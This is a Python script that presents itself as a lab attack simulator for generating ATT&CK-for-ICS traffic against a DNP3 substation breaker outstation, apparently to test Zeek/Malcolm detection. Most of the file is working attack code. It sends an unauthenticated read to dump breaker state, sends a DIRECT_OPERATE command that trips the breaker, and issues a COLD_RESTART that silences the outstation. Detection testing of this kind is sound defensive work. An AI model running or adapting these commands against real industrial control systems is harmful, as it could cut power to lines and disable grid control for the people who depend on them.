"""DNP3 ICS attack simulator — triggers ATT&CK-for-ICS-labeled traffic against
the substation breaker outstation. DNP3 has no authentication in this
implementation (matching real-world DNP3 deployments without Secure
Authentication v5/v6 enabled) — every technique below is just a normal
protocol function aimed at someone else's outstation, no credentials needed.

Malcolm's ACID package only has detection tables for S7comm/CIP/BACnet (see
reference_ot_ics_acid_triggers memory) — DNP3 gets no free ACID technique
tags here. Zeek's own bundled dnp3.log/dnp3_control.log analyzers still parse
every request/response below (function code, group/variation, CROB fields),
which is what any future DNP3-specific alerting (a hand-built OpenSearch
monitor, the same way Modbus's was built without ACID coverage either) would
be built on top of.

Wire protocol is hand-rolled (dnp3_protocol.py/dnp3_logic.py, copied unchanged
from ansible/roles/ot/tasks/files/dnp3/ alongside this script) since DNP3 has
no convenient pip-installable client library the way Modbus/S7comm/BACnet/
EtherNet-IP do here (pymodbus/snap7/BAC0/cpppo) — pydnp3 exists but needs a
C++ build toolchain, overkill for a lab attack script.

Each technique below runs in its own separate TCP connection — same
isolation rationale as s7comm_attack.py/bacnet_attack.py: a parser desync or
connection-ending error in one technique can't swallow the others.

Three techniques, mapped to MITRE ATT&CK for ICS:
  T0846 Remote System Discovery — unauthenticated READ (class 0 poll): dumps
    breaker status + line current, no creds needed.
  T0855 Unauthorized Command Message — one-step DIRECT_OPERATE (skipping the
    safer SELECT-then-OPERATE the legit master uses) to trip the breaker.
    Real-world equivalent of de-energizing a line with zero authentication.
  T0814 Denial of Service — COLD_RESTART (function code 0x0D/13). The
    outstation goes genuinely silent for several seconds afterward — not
    simulated, the real server actually stops responding to everything.

Usage:
    python3 dnp3_attack.py --target 192.168.30.10
"""

from __future__ import annotations

import argparse
import logging
import socket

from dnp3_logic import CROB_TRIP, MASTER_CONTROL
from dnp3_protocol import (
    FC_COLD_RESTART,
    FC_DIRECT_OPERATE,
    FC_READ,
    build_app_request,
    decode_crob,
    decode_full_status,
    encode_class_read,
    encode_crob,
    parse_app_header,
    parse_response_header,
    recv_frame,
    unwrap_transport,
    wrap_frame,
    wrap_transport,
)

log = logging.getLogger("dnp3_attack")

ATTACKER_ADDR = 99
OUTSTATION_ADDR = 1


def _send(sock: socket.socket, function_code: int, object_bytes: bytes = b"") -> None:
    req = build_app_request(function_code, seq=0, object_bytes=object_bytes)
    frame = wrap_frame(MASTER_CONTROL, dest=OUTSTATION_ADDR, src=ATTACKER_ADDR, user_data=wrap_transport(req, seq=0))
    sock.sendall(frame)


def recon(host: str, port: int) -> None:
    log.info("[T0846 Remote System Discovery] unauthenticated READ (class 0 poll)")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5.0)
    try:
        sock.connect((host, port))
        _send(sock, FC_READ, encode_class_read(0))
        _control, _dest, _src, user_data = recv_frame(sock)
        _iin1, _iin2, obj_bytes = parse_response_header(unwrap_transport(user_data))
        closed, current = decode_full_status(obj_bytes)
        log.info("breaker_closed=%s line_current=%.1fA (no credentials required)", closed, current)
    except Exception as exc:
        log.error("recon FAILED — %s", exc)
    finally:
        sock.close()


def trip_breaker(host: str, port: int) -> None:
    log.info("[T0855 Unauthorized Command Message] unauthenticated DIRECT_OPERATE — TRIP, skipping SELECT entirely")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5.0)
    try:
        sock.connect((host, port))
        _send(sock, FC_DIRECT_OPERATE, encode_crob(CROB_TRIP))
        _control, _dest, _src, user_data = recv_frame(sock)
        app = unwrap_transport(user_data)
        _fc, off = parse_app_header(app)
        _code, status = decode_crob(app[off:])
        log.info("DIRECT_OPERATE result: %s", "SUCCESS -- breaker tripped" if status == 0 else "FAILED")
    except Exception as exc:
        log.error("trip-breaker FAILED — %s", exc)
    finally:
        sock.close()


def cold_restart(host: str, port: int) -> None:
    log.info("[T0814 Denial of Service] unauthenticated COLD_RESTART — outstation will go dark")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5.0)
    try:
        sock.connect((host, port))
        _send(sock, FC_COLD_RESTART)
        _control, _dest, _src, _user_data = recv_frame(sock)
        log.info("COLD_RESTART accepted by outstation — every master loses contact now")
    except Exception as exc:
        log.error("cold-restart FAILED — %s", exc)
    finally:
        sock.close()


def attack(host: str, port: int) -> None:
    recon(host, port)
    trip_breaker(host, port)
    cold_restart(host, port)
    log.info("Attack sequence complete.")


def main() -> None:
    parser = argparse.ArgumentParser(description="DNP3 ACID/ATT&CK ICS attack simulator")
    parser.add_argument("--target", required=True, help="DNP3 outstation IP (e.g. 192.168.30.10)")
    parser.add_argument("--port", type=int, default=20000)
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
    attack(args.target, args.port)


if __name__ == "__main__":
    main()
